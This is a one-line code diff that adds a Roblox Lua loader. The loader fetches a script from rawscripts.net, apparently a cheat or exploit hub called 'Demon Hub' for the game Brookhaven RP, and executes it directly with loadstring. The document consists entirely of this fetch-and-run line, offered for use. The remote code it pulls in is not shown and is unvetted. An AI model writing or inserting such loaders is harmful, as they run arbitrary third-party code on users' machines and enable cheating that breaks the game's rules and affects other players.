@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Demon-Hub-63275"))()
